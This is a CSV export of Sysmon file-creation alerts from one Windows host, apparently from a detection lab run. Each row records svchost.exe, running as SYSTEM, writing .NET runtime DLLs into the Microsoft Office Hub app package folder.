"2025-12-26 11:29:12.097 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175036,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Diagnostics.TextWriterTraceListener.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.095 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.095","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.097 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175037,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Diagnostics.Tools.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.095 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.095","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.097 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175038,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Diagnostics.TraceSource.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.095 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.095","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.098 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175039,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Diagnostics.Tracing.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.095 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.095","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.098 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175040,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.097 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.097","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.104 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175041,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Drawing.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.097 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.097","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.104 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175042,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Drawing.Primitives.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.097 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.097","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.104 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175043,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Dynamic.Runtime.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.099 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.099","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.104 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175044,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Formats.Asn1.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.099 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.101","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.105 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175045,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Formats.Tar.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.101 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.101","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.105 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175046,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Globalization.Calendars.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.101 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.101","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.105 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175047,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Globalization.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.103 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.103","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.105 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175048,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Globalization.Extensions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.103 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.103","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.105 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175049,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.Compression.Brotli.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.103 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.103","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.111 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175050,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.Compression.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.105 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.105","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.111 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175051,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.Compression.FileSystem.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.105 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.105","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.111 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175052,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.Compression.Native.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.105 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.107","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.111 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175053,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.Compression.ZipFile.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.107 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.107","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.116 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175054,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.107 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.107","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.116 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175055,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.FileSystem.AccessControl.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.107 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.107","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.116 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175056,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.FileSystem.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.107 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.109","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.116 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175057,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.FileSystem.DriveInfo.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.109 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.109","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.117 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175058,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.FileSystem.Primitives.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.109 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.109","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.117 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175059,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.FileSystem.Watcher.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.109 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.111","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.117 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175060,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.IsolatedStorage.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.111 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.111","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.117 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175061,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.MemoryMappedFiles.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.111 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.111","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.117 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175062,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.Pipes.AccessControl.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.111 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.111","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.117 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175063,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.Pipes.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.113 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.113","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.117 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175064,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.IO.UnmanagedMemoryStream.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.113 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.113","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.117 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175065,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Linq.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.113 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.113","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.118 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175066,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Linq.Expressions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.115 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.115","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.118 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175067,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Linq.Parallel.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.115 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.115","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.118 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175068,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Linq.Queryable.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.115 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.115","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.118 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175069,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Memory.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.115 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.117","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.118 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175070,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.117 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.117","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.120 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175071,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.Http.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.117 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.117","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.120 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175072,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.Http.Json.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.117 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.119","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
